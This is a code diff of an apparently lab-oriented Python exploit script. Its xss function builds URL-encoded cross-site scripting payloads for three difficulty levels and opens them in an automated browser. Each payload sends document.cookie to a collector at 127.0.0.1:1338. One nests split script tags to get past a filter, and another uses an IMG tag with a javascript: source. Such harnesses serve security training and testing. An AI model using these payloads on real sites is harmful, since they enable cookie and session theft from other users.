@@ -43,12 +43,12 @@ def xss(vuln_type, level):
         url = '/'.join([TARGET_SERVER_ENDPOINT, 'xss', vuln_type, level]) + '?comment=' + comment
     else:
         if level == 'low':
-            comment = '%3Cscript%3Evar%20pos%20%3D%20document.URL.indexof(%22name%3D%22%20%2B%205%3B%20document.write(document.URL.substring(pos%2Cdocument.URL.length))%3B%3C%2Fscript%3E%26name%3D%3Cscript%3Ewindow.open(%26apos%3Bhttp%3A%2F%2F127.0.0.1%3A1338%2Fxss%2F2%3Fcookie%3D%26apos%3B%20%2B%20document.cookie)%3C%2Fscript%3E'
+            lang = '%3Cscript%3Ewindow.open(%26apos%3Bhttp%3A%2F%2F127.0.0.1%3A1338%2Fxss%2F2%3Fcookie%3D%26apos%3B%20%2B%20document.cookie)%3C%2Fscript%3E'
         elif level == 'medium':
-            comment = '%3Cscri%3Cscript%3Ept%3Ewindow.open(%22http%3A%2F%2F127.0.0.1%3A1338%2Fxss%2F3%3Fcookie%3D%22%20%2B%20document.cookie)%3C%2Fscri%3C%2Fscript%3Ept%3E'
+            lang = '%3Cscri%3Cscript%3Ept%3Ewindow.open(%22http%3A%2F%2F127.0.0.1%3A1338%2Fxss%2F3%3Fcookie%3D%22%20%2B%20document.cookie)%3C%2Fscri%3C%2Fscript%3Ept%3E'
         else:
-            comment = '%3CIMG%20SRC%3D%22javascript%3Awindow.open(%26apos%3Bhttp%3A%2F%2F127.0.0.1%3A1338%2Fxss%2F2%3Fcookie%3D%26apos%3B%20%2B%20document.cookie)%3B%22%3E'
-        url = '/'.join([TARGET_SERVER_ENDPOINT, 'xss', vuln_type, level]) + '?lang=' + comment
+            lang = '%3CIMG%20SRC%3D%22javascript%3Awindow.open(%26apos%3Bhttp%3A%2F%2F127.0.0.1%3A1338%2Fxss%2F2%3Fcookie%3D%26apos%3B%20%2B%20document.cookie)%3B%22%3E'
+        url = '/'.join([TARGET_SERVER_ENDPOINT, 'xss', vuln_type, level]) + '?lang=' + lang
 
 
     driver.get(url)
